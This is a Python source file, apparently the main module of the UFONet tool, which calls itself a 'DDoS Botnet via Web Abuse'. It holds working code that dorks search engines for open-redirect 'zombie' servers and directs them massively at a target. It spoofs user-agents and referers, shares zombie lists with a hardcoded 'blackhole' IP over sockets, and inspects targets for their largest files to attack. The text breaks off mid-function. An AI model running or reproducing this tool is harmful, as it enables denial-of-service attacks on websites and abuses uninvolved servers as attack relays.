#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, sys, re, traceback, random, time, threading, base64, socket, httplib
import StringIO, urllib, urllib2, cgi
from urlparse import urlparse
from random import randrange, shuffle
from options import UFONetOptions
from update import Updater
from herd import Herd
from zombie import Zombie
from doll import Doll

DEBUG = 0

class UFONet(object):
    def __init__(self):
        self.mothership_ids = [] # generating name/id for your mothership ;-)
        self.mothership_ids.append(base64.urlsafe_b64encode('avalon'))
        self.mothership_ids.append(base64.urlsafe_b64encode('cruiser'))
        self.mothership_ids.append(base64.urlsafe_b64encode('darkstar'))
        self.mothership_ids.append(base64.urlsafe_b64encode('morgana'))
        self.mothership_ids.append(base64.urlsafe_b64encode('sweetcandy'))
        self.mothership_ids.append(base64.urlsafe_b64encode('io'))
        self.mothership_ids.append(base64.urlsafe_b64encode('lain'))
        self.mothership_ids.append(base64.urlsafe_b64encode('manhattan'))
        self.mothership_ids.append(base64.urlsafe_b64encode('skywalker'))
        self.mothership_ids.append(base64.urlsafe_b64encode('defender'))
        self.mothership_ids.append(base64.urlsafe_b64encode('casiopea'))
        self.mothership_ids.append(base64.urlsafe_b64encode('orion'))
        self.mothership_ids.append(base64.urlsafe_b64encode('pluto'))
        self.mothership_ids.append(base64.urlsafe_b64encode('cosmic banana'))
        self.mothership_ids.append(base64.urlsafe_b64encode('lucio'))
        self.mothership_id = random.choice(self.mothership_ids).strip()
        self.mothership_hash = random.getrandbits(128) # generating random evasion hash 

        self.search_engines = [] # available dorking search engines
        self.search_engines.append('duck')
        self.search_engines.append('google')
        self.search_engines.append('bing')
        self.search_engines.append('yahoo')
        self.search_engines.append('yandex')

        self.check_engines = [] # available 'check is up' engines with payload: checker.xxx/target
        self.check_engines.append('http://www.downforeveryoneorjustme.com/')
        self.check_engines.append('http://www.isup.me/')

        self.agents = [] # user-agents
        self.agents.append('Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)')
        self.agents.append('Mozilla/5.0 (Linux; U; Android 0.5; en-us)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13')
        self.agents.append('Opera/9.25 (Windows NT 6.0; U; en)')
        self.agents.append('Mozilla/2.02E (Win95; U)')
        self.agents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
        self.agents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)')
        self.agents.append('(Privoxy/1.0)')
        self.agents.append('CERN-LineMode/2.15')
        self.agents.append('cg-eye interactive')
        self.agents.append('China Local Browser 2.6')
        self.agents.append('ClariaBot/1.0')
        self.agents.append('Comos/0.9_(robot@xyleme.com)')
        self.agents.append('Crawler@alexa.com')
        self.agents.append('DonutP; Windows98SE')
        self.agents.append('Dr.Web (R) online scanner: http://online.drweb.com/')
        self.agents.append('Dragonfly File Reader')
        self.agents.append('Eurobot/1.0 (http://www.ayell.eu)')
        self.agents.append('FARK.com link verifier')
        self.agents.append('FavIconizer')
        self.agents.append('Feliz - Mixcat Crawler (+http://mixcat.com)')
        self.agents.append('TwitterBot (http://www.twitter.com)')
        self.user_agent = random.choice(self.agents).strip()

        self.referer = 'http://127.0.0.1/'
        self.head = False
        self.payload = False
        self.external = False
        self.attack_mode = False
        self.retries = ''
        self.delay = ''
        self.connection_failed = False
        self.total_possible_zombies = 0
        self.herd = Herd(self)
        self.sem = False
        self.port = "8080" # default UFONet injection port
        self.blackhole = '176.28.23.46' # download/upload zombies destination

    def create_options(self, args=None):
        self.optionParser = UFONetOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def banner(self):
        print '='*75, "\n"
        print "888     888 8888888888 .d88888b.  888b    888          888    "   
        print "888     888 888        d88P Y888b 8888b   888          888    "
        print "888     888 888       888     888 88888b  888          888    "
        print "888     888 8888888   888     888 888Y88b 888  .d88b.  888888 "
        print "888     888 888       888     888 888 Y88b888 d8P  Y8b 888    "
        print "888     888 888       888     888 888  Y88888 88888888 888    "
        print "Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  "
        print " 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888"       
        print self.optionParser.description, "\n"
        print '='*75

    def try_running(self, func, error, args=None):
        options = self.options
        args = args or []
        try:
            return func(*args)
        except Exception as e:
            print(error, "error")
            if DEBUG:
                traceback.print_exc()

    def run(self, opts=None):
        if opts:
            self.create_options(opts)
        options = self.options

        # start threads
        if not self.options.threads:
            self.options.threads=5 # default number of threads
        self.sem = threading.Semaphore(self.options.threads)

        # check proxy options
        proxy = options.proxy
        if options.proxy:
            try:
                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                m = re.search(pattern, proxy)
                if m is None:
                    self.banner()
                    print ("\n[Error] - Proxy malformed!\n")
                    return #sys.exit(2)
            except Exception:
                self.banner()
                print ("\n[Error] - Proxy malformed!\n")
                return #sys.exit(2)

        # check tor connection
        if options.checktor:
            self.banner()
            try:
                print("\nSending request to: https://check.torproject.org\n")
                tor_reply = urllib2.urlopen("https://check.torproject.org").read()
                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
                if not tor_reply or 'Congratulations' not in tor_reply:
                    print("It seems that Tor is not properly set.\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
                else:
                    print("Congratulations!. Tor is properly being used :-)\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
            except:
                print("Cannot reach TOR checker system!. Are you correctly connected?\n")

        # search for 'zombies' on search engines results
        if options.search:
            zombies = []
            if options.engine:
                engine = options.engine
            else:
                engine = "duck"
            try:
                self.banner()
                if options.allengines:
                    for e in self.search_engines:
                        engine = e
                        print("\nSearching for 'zombies' using: "+engine+"\n")
                        print '='*22 + '\n'
                        self.options.engine = engine
                        zombies_chain = self.search_zombies(dork='')
                        if zombies_chain != None:
                            for zombie in zombies_chain:
                                zombies.append(zombie)
                    print '='*44
                    print "\nTotal zombies found: ", len(zombies), "\n"
                    print '='*44 + '\n'
                else:
                    print("\nSearching for 'zombies' using: "+engine+"\n")
                    print '='*22 + '\n'
                    zombies = self.search_zombies(dork='')

                if zombies == None:
                    check_url_link_reply = "N"
                    pass
                else:
                    if not self.options.forceyes:
                        check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
                    else:
                        check_url_link_reply = "Y"
                if check_url_link_reply == "n" or check_url_link_reply == "N":
                    print "\nBye!\n"
                else:
                    test = self.testing(zombies)
            except Exception:
                print ("[Error] - Something wrong searching!\n")

        # search for 'zombies' from a list of 'dorks'
        if options.dorks:
            if options.engine:
                engine = options.engine
            else:
                engine = "duck"
            try:
                self.banner()
                if options.allengines:
                    zombies = []
                    for e in self.search_engines:
                        engine = e
                        print("\nSearching for 'zombies' using: "+engine+ " [from a list of 'dorks']\n")
                        self.options.engine = engine
                        dorks = self.extract_dorks()
                        if not dorks:
                            return
                        for dork in dorks:
                            print '='*22
                            print "Dork:", dork
                            print '='*22 + '\n'
                            dorked_zombies = self.search_zombies(dork)
                            if dorked_zombies != None:
                                for zombie in dorked_zombies:
                                    zombies.append(zombie)
                else:
                    print("\nSearching for 'zombies' using: "+engine+ " [from a list of 'dorks']\n")
                    dorks = self.extract_dorks()
                    if not dorks:
                        return
                    zombies = []
                    for dork in dorks:
                        print '='*22
                        print "Dork:", dork
                        print '='*22 + '\n'
                        dorked_zombies = self.search_zombies(dork)
                        for zombie in dorked_zombies:
                            zombies.append(zombie)
                print '='*44
                print '=Total Possible Zombies:', str(self.total_possible_zombies)
                print '='*44 + '\n'
                if str(self.total_possible_zombies) == '0':
                    print "Not any victim(s) found... Bye!\n"
                    return #sys.exit(2)
                if not self.options.forceyes:
                    check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
                    print '-'*25
                else:
                    check_url_link_reply = "Y"
                if check_url_link_reply == "n" or check_url_link_reply == "N":
                    print "\nBye!\n"
                else:
                    test = self.testing(zombies)
            except Exception:
                print ("[Error] - Something wrong searching!\n")

        # test web 'zombie' servers -> show statistics
        if options.test: 
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
            except Exception:
                print ("\n[Error] - Something wrong testing!\n")
                traceback.print_exc()
 
        # attack target -> exploit Open Redirect massively and connect all vulnerable servers to a target
        if options.target:
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                attack = self.attacking(zombies)
            except Exception:
                print ("\n[Error] - Something wrong attacking!\n")
                traceback.print_exc()

        # inspect target -> inspect target's components sizes
        if options.inspect:
            try:
                self.banner()
                print("\nInspecting target to find the best place to attack... SSssh!\n")
                print '='*22 + '\n'
                inspection = self.inspecting()
            except Exception, e:
                traceback.print_exc()
                print ("\n[Error] - Something wrong inspecting... Not any object found!\n")
                return #sys.exit(2)

        # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
        if options.attackme:
            try:
                self.banner()
                print("\nOrdering 'zombies' to attack you for benchmarking ;-)\n")
                print("[Warning] You are going to reveal your real IP to your zombies...\n")
                if not self.options.forceyes:
                    update_reply = raw_input("Wanna continue (Y/n)")
                    print '-'*25
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print "\n[Info] Aborting 'Attack-Me' test... Bye!\n"
                    return
                print '='*22
                print("Mothership ID: " + str(base64.b64decode(self.mothership_id))) + " | RND: " + str(self.mothership_hash)
                f = open("alien", "w") # generate random alien worker
                f.write(str(self.mothership_hash))
                f.close()
                print '='*22 + '\n'
                print("Checking NAT/IP configuration:\n")
                nat = self.check_nat()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                attackme = self.attackme(zombies)
            except Exception, e:
                traceback.print_exc()
                print ("\n[Error] - Something wrong redirecting 'zombies' against you...\n")
                return #sys.exit(2)

#        # crawl target -> crawl target's places
#        if options.crawl:
#            try:
#                self.banner()
#                print("\nCrawlering target's links to discover web structure...\n")
#                print '='*22 + '\n'
#                crawler = self.crawlering()
#            except Exception, e:
#                print ("[Error] - Something wrong crawlering!\n")
#                return #sys.exit(2)

        # check/update for latest stable version
        if options.update:
            self.banner()
            try:
                print("\nTrying to update automatically to the latest stable version\n")
                Updater() 
            except:
                print("\nSomething was wrong!. You should clone UFONet manually with:\n")
                print("$ git clone https://github.com/epsylon/ufonet\n")

        # launch GUI/Web interface
        if options.web:
            self.create_web_interface()
            return

        # generate 'blackhole' server to share 'zombies'
        if options.blackhole is not None:
            self.banner()
            try:
                blackhole_lib = os.path.abspath(os.path.join('..', 'server')) # add 'blackhole' lib
                sys.path.append(blackhole_lib)
                from server.blackhole import BlackHole
                print("\nInitiating void generation sequence...\n")
                print '='*22 + '\n'
                app = BlackHole()
                app.start()
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print("\nTerminating void generation sequence...\n")
                app.collapse()
            except Exception, e:
                print "[Error] "+str(e) 
                print("\nSomething was wrong generating 'blackhole'. Aborting...\n")

        # download list of 'zombies' from a 'blackhole' IP
        if options.dip is not None:
            options.download = True
            self.blackhole = options.dip

        # download list of 'zombies' from server
        if options.download:
            try:
                self.banner()
                if options.dip is not None:
                    print("\nDownloading list of 'zombies' from server "+self.blackhole+" ...\n")
                else:
                    print("\nDownloading list of 'zombies' from server ...\n")
                print '='*22 + '\n'
                download_list = self.downloading_list()
            except Exception, e:
                print ("[Error] - Something wrong downloading!\n"+str(e))
                return #sys.exit(2)

        # upload list of 'zombies' to a 'blackhole' IP
        if options.upip is not None:
            options.upload = True
            self.blackhole = options.upip
            
        # upload list of 'zombies' to server
        if options.upload:
            try:
                self.banner()
                if options.upip is not None:
                    print("\nUploading list of 'zombies' to server "+self.blackhole+" ...\n")
                else:
                    print("\nUploading list of 'zombies' to server ...\n")
                print '='*22 + '\n'
                upload_list = self.uploading_list()
            except Exception, e:
                print ("[Error] - Something wrong uploading!\n"+str(e))
		traceback.print_exc()
                return #sys.exit(2)

    # starting new zombie thread
    def connect_zombies(self,zombie): 
        z=Zombie(self,zombie)
        t = threading.Thread(target=z.connect, name=zombie)
        t.start()

    # single connection handling
    def connect_zombie(self,zombie): 
        z=Zombie(self,zombie)
        return z.connect()

    def uploading_list(self): 
        import gzip
        abductions = "abductions.txt.gz"
        try:
            print("Checking integrity of 'blackhole'...\n")
            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz', # Turina
                       abductions)
            print("Vortex: IS READY!")
            f_in = gzip.open(abductions, 'rb')
            f_out = open('abductions.txt', 'wb')
            f_out.write(f_in.read())
            f_in.close()
            f_out.close()
            os.remove(abductions) # remove .gz file
            num_zombies = 0
            with open('abductions.txt') as f:
                for _ in f:
                    num_zombies = num_zombies + 1
            print("\n[Info] - Number of 'zombies' on 'blackhole': "+ str(num_zombies))
            print '-'*12 + '\n'
            if not self.options.forceyes:
                update_reply = raw_input("Wanna merge ONLY new 'zombies' to server (Y/n)")
                print '-'*25
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                os.remove('abductions.txt') # remove .txt file
                print "\n[Info] - Aborting upload process and cleaning temporal files. Bye!\n"
                return
            else:
                print "\n[Info] - Checking integrity of your list of 'zombies'. Starting test!\n" # only upload valid zombies
                print '='*35
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
                zombies_community = []
                zombies_added = 0
                f = open('abductions.txt')
                abductions = f.readlines()
                abductions = [abduction.strip() for abduction in abductions]
                f.close()
                fz = open("zombies.txt")
                zombies = fz.readlines()
                zombies = [zombie.strip() for zombie in zombies]
                fz.close()
                for zombie in zombies:
                    if zombie not in abductions:
                        zombies_community.append(zombie)
                        zombies_added = zombies_added + 1
                    else:
                        pass
                print '-'*12 + '\n'
                print("[Info] - Number of new 'zombies' to be added: " + str(zombies_added) + '\n')
                print '-'*12 + '\n'
                if zombies_added == 0:
                    os.remove('abductions.txt') # remove .txt file
                    print("[Info] - Hehehe.. You should try to search for new 'zombies'. These are already in the server. ;-)\n")
                    return
                else:
                    fc = gzip.open('community.txt.gz', 'wb')
                    for zombie in zombies_community:
                        fc.write(zombie.strip()+"\n")
                    fc.close()
                    os.remove('abductions.txt') # remove .txt file
                    print("[Info] - Starting to upload new 'zombies'...\n")
                    try: # open a socket and send data to ufonet_community reciever
                        import socket
                        host = self.blackhole 
                        cport = 9991
                        mport = 9990
                        try:
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community.txt.gz')
                            cs.close()
                            time.sleep(2)
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            f = open('community.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms.send(data)
                            ms.close()
                            os.remove('community.txt.gz') # remove local .gz file after transfer
                            print '-'*12 + '\n'
                            print("[Info] - Transfer: DONE!. Thanks for your contribution ;-)\n")
                        except Exception, e:
                            print str(e) + "\n"
                    except:
                        print '-'*12 + '\n'
                        print("[Error] - Connecting sockets to 'blackhole'. Aborting!\n")
                        return
        except:
            print '-'*12 + '\n'
            print("[Error] - Unable to upload list of 'zombies' to server. ;(\n")
            return #sys.exit(2)

    def downloading_list(self): # add your mirror to protect zombies list
        import urllib, gzip
        abductions = "abductions.txt.gz"
        try:
            print("Trying 'blackhole': "+self.blackhole+"\n")
            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
                       abductions)
            print("Vortex: IS READY!")
        except:
            print("Vortex: FAILED!")
            print '-'*12 + '\n'
            print("[Error] - Unable to download list of 'zombies' from 'blackhole' ;(\n")
            return #sys.exit(2)
        print '-'*12 + '\n'
        f_in = gzip.open(abductions, 'rb')
        f_out = open('abductions.txt', 'wb')
        f_out.write(f_in.read())
        f_in.close()
        f_out.close()
        os.remove(abductions) # remove .gz file
        num_zombies = 0
        with open('abductions.txt') as f:
            for _ in f:
                num_zombies = num_zombies + 1
        print("[Info] - Congratulations!. Total of 'zombies' downloaded: " + str(num_zombies))
        print '-'*12
        if not self.options.forceyes:
            update_reply = raw_input("\nWanna merge ONLY new 'zombies' to your army (Y/n)")
            print '-'*25
        else:
            update_reply = "Y"
        if update_reply == "n" or update_reply == "N":
            os.remove('abductions.txt') # remove .txt file
            print "\n[Info] - List downloaded has been removed. Bye!\n"
        else:
            zombies_ready = []
            f = open('abductions.txt')
            abductions = f.readlines()
            f.close()
            fz = open("zombies.txt")
            zombies = fz.readlines()
            fz.close()
            for abduction in abductions:
                abduction = abduction.replace('\n','') 
                if abduction not in zombies:
                    zombies_ready.append(abduction)
                else:
                    pass
            self.update_zombies(zombies_ready)
            os.remove('abductions.txt') # remove .txt file
            print "\n[Info] - Botnet updated! ;-)\n"

    def create_web_interface(self):
        # launch webserver+gui
        from webgui import ClientThread
        import webbrowser
        host = '0.0.0.0'
        port = 9999
        try: 
            webbrowser.open('http://127.0.0.1:9999', new=1)
            tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	    tcpsock.bind((host,port))
	    while True:
	        tcpsock.listen(4)
	        #print "Listening for incoming connections on http://%s:%d" % (host,port)
	        (clientsock, (ip, port)) = tcpsock.accept()
	        newthread = ClientThread(ip, port, clientsock)
                newthread.start()
        except (KeyboardInterrupt, SystemExit):
            sys.exit()

#    def crawlering(self):
#        # crawl target's links to discover web structure           
#        options = self.options
#        myurl = options.crawl
#        for i in re.findall('''href=["'](.[^"']+)["']''', urllib.urlopen(myurl).read(), re.I):
#            print i 

    def inspecting(self):
        # inspect HTML target's components sizes (ex: http://target.com/foo)           
        # [images, .mov, .webm, .avi, .swf, .mpg, .mpeg, .mp3, .ogg, .ogv, 
        # .wmv, .css, .js, .xml, .php, .html, .jsp, .asp, .txt]
        options = self.options
        biggest_files = {}
        try:
            target = str(options.inspect)
            if target.endswith(""):
                target.replace("", "/")
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            try:
                if target.startswith('https'): # replacing https request method (unsecure)
                    print "[WARNING!] - Inspection doesn't support https connections"
                    if not self.options.forceyes:
                        inspection_reply = raw_input("\nWanna follow using http (non encrypted) (Y/n)")
                    else:
                        inspection_reply = "Y"
                    if inspection_reply == "Y" or inspection_reply == "y":
                        print '\n' + '='*22 + '\n'
                        target = target.replace('https', 'http')
                    else:
                        print "\nBye!\n"
                        return
                if target.startswith("http://"):
                    req = urllib2.Request(target, None, headers)
                    target_reply = urllib2.urlopen(req).read()
                else:
                    print "[Error] - Target url not valid!\n"
                    return #sys.exit(2)
            except: 
                print('[Error] - Unable to connect to target\n')
                return #sys.exit(2)
        except:
            print '\n[Error] - Cannot found any object', "\n"
            return #sys.exit(2)
        #print target_reply
        try: # search for image files
            regex_img = []
            regex_img1 = "<img src='(.+?)'" # search on target's results using regex with simple quotation
            regex_img.append(regex_img1)
            regex_img2 = '<img src="(.+?)"' # search on target's results using regex with double quotation
            regex_img.append(regex_img2)
            #regex_img3 = '<img src=(.+?)>' # search on target's results using regex without quotations
            #regex_img.append(regex_img3)
            for regimg in regex_img:
                pattern_img = re.compile(regimg)
                img_links = re.findall(pattern_img, target_reply)
            imgs = {}
            for img in img_links:
                print('+Image found: ' + img)
                try:
                    if img.startswith('http'):
                        img_file = urllib.urlopen(img)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        img_file = urllib.urlopen(target_url + img)
                    size = img_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(img_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Image)')
                    size = 0
                imgs[img] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print imgs
            biggest_image = max(imgs.keys(), key=lambda x: imgs[x]) # search/extract biggest image value from dict
            biggest_files[biggest_image] = imgs[biggest_image] # add biggest image to list
        except: # if not any image found, go for next
            pass
        try: # search for .mov files
            regex_mov = []
            regex_mov1 = "<a href='(.+?.mov)'" # search on target's results using regex with simple quotation
            regex_mov.append(regex_mov1)
            regex_mov2 = '<a href="(.+?.mov)"' # search on target's results using regex with double quotation
            regex_mov.append(regex_mov2)
            #regex_mov3 = '<a href=(.+?.mov)' # search on target's results using regex without quotations
            #regex_mov.append(regex_mov3)
            for regmov in regex_mov:
                pattern_mov = re.compile(regmov)
                mov_links = re.findall(pattern_mov, target_reply)
            movs = {}
            for mov in mov_links:
                print('+Video (.mov) found: ' + mov)
                try:
                    if mov.startswith('http'):
                        mov_file = urllib.urlopen(mov)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        mov_file = urllib.urlopen(target_url + mov)
                    size = mov_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(mov_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                movs[mov] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print movs
            biggest_mov = max(movs.keys(), key=lambda x: movs[x]) # search/extract biggest video (.mov) value from dict
            biggest_files[biggest_mov] = movs[biggest_mov] # add biggest video (.mov) to list
        except: # if not any .mov found, go for next
            pass 
        try: # search for .webm files
            regex_webm = []
            regex_webm1 = "<a href='(.+?.webm)'" # search on target's results using regex with simple quotation
            regex_webm.append(regex_webm1)
            regex_webm2 = '<a href="(.+?.webm)"' # search on target's results using regex with double quotation
            regex_webm.append(regex_webm2)
            #regex_webm3 = '<a href=(.+?.webm)' # search on target's results using regex without quotations
            #regex_webm.append(regex_webm3)
            for regwebm in regex_webm:
                pattern_webm = re.compile(regwebm)
                webm_links = re.findall(pattern_webm, target_reply)
            webms = {}
            for webm in webm_links:
                print('+Video (.webm) found: ' + webm)
                try:
                    if webm.startswith('http'):
                        webm_file = urllib.urlopen(webm)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        webm_file = urllib.urlopen(target_url + webm)
                    size = webm_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(webm_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                webms[webm] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print webms
            biggest_webm = max(webms.keys(), key=lambda x: webms[x]) # search/extract biggest video (.webm) value from dict
            biggest_files[biggest_webm] = webms[biggest_webm] # add biggest video (.webm) to list
        except: # if not any .webm found, go for next
            pass 
        try: # search for .avi files
            regex_avi = []
            regex_avi1 = "<a href='(.+?.avi)'" # search on target's results using regex with simple quotation
            regex_avi.append(regex_avi1)
            regex_avi2 = '<a href="(.+?.avi)"' # search on target's results using regex with double quotation
            regex_avi.append(regex_avi2)
            #regex_avi3 = '<a href=(.+?.avi)' # search on target's results using regex without quotations
            #regex_avi.append(regex_avi3)
            for regavi in regex_avi:
                pattern_avi = re.compile(regavi)
                avi_links = re.findall(pattern_avi, target_reply)
            avis = {}
            for avi in avi_links:
                print('+Video (.avi) found: ' + avi)
                try:
                    if avi.startswith('http'):
                        avi_file = urllib.urlopen(avi)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        avi_file = urllib.urlopen(target_url + avi)
                    size = avi_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(avi_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                avis[avi] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print avis
            biggest_avi = max(avis.keys(), key=lambda x: avis[x]) # search/extract biggest video (.avi) value from dict
            biggest_files[biggest_avi] = avis[biggest_avi] # add biggest video (.avi) to list
        except: # if not any .avi found, go for next
            pass
        try: # search for .swf files
            regex_swf = []
            regex_swf1 = "<value='(.+?.swf)'" # search on target's results using regex with simple quotation
            regex_swf.append(regex_swf1)
            regex_swf2 = '<value="(.+?.swf)"' # search on target's results using regex with double quotation
            regex_swf.append(regex_swf2)
            #regex_swf3 = '<value=(.+?.swf)' # search on target's results using regex without quotations
            #regex_swf.append(regex_swf3)
            for regswf in regex_swf:
                pattern_swf = re.compile(regswf)
                swf_links = re.findall(pattern_swf, target_reply)
            swfs = {}
            for swf in swf_links:
                print('+Flash (.swf) found: ' + swf)
                try:
                    if swf.startswith('http'):
                        swf_file = urllib.urlopen(swf)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        swf_file = urllib.urlopen(target_url + swf)
                    size = swf_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(swf_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Flash)')
                    size = 0
                swfs[swf] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print swfs
            biggest_swf = max(swfs.keys(), key=lambda x: swfs[x]) # search/extract biggest flash (.swf) value from dict
            biggest_files[biggest_swf] = swfs[biggest_swf] # add biggest flash (.swf) to list
        except: # if not any .swf found, go for next
            pass
        try: # search for .mpg files
            regex_mpg = []
            regex_mpg1 = "<src='(.+?.mpg)'" # search on target's results using regex with simple quotation
            regex_mpg.append(regex_mpg1)
            regex_mpg2 = '<src="(.+?.mpg)"' # search on target's results using regex with double quotation
            regex_mpg.append(regex_mpg2)
            #regex_mpg3 = '<src=(.+?.mpg)' # search on target's results using regex without quotations
            #regex_mpg.append(regex_mpg3)
            for regmpg in regex_mpg:
                pattern_mpg = re.compile(regmpg)
                mpg_links = re.findall(pattern_mpg, target_reply)
            mpgs = {}
            for mpg in mpg_links:
                print('+Video (.mpg) found: ' + mpg)
                try:
                    if mpg.startswith('http'):
                        mpg_file = urllib.urlopen(mpg)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        mpg_file = urllib.urlopen(target_url + mpg)
                    size = mpg_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(mpg_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                mpgs[mpg] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print mpgs
            biggest_mpg = max(mpgs.keys(), key=lambda x: mpgs[x]) # search/extract biggest video (.mpg) value from dict
            biggest_files[biggest_mpg] = mpgs[biggest_mpg] # add biggest video (.mpg) to list
        except: # if not any .mpg found, go for next
            pass
        try: # search for .mpeg files
            regex_mpeg = []
            regex_mpeg1 = "<src='(.+?.mpeg)'" # search on target's results using regex with simple quotation
            regex_mpeg.append(regex_mpeg1)
            regex_mpeg2 = '<src="(.+?.mpeg)"' # search on target's results using regex with double quotation
            regex_mpeg.append(regex_mpeg2)
            #regex_mpeg3 = '<src=(.+?.mpeg)' # search on target's results using regex without quotations
            #regex_mpeg.append(regex_mpeg3)
            for regmpeg in regex_mpeg:
                pattern_mpeg = re.compile(regmpeg)
                mpeg_links = re.findall(pattern_mpeg, target_reply)
            mpegs = {}
            for mpeg in mpeg_links:
                print('+Video (.mpeg) found: ' + mpeg)
                try:
                    if mpeg.startswith('http'):
                        mpeg_file = urllib.urlopen(mpeg)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        mpeg_file = urllib.urlopen(target_url + mpeg)
                    size = mpeg_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(mpeg_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                mpegs[mpeg] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print mpegs
            biggest_mpeg = max(mpegs.keys(), key=lambda x: mpegs[x]) # search/extract biggest video (.mpeg) value from dict
            biggest_files[biggest_mpeg] = mpegs[biggest_mpeg] # add biggest video (.mpeg) to list
        except: # if not any .mpeg found, go for next
            pass
        try: # search for .mp3 files
            regex_mp3 = []
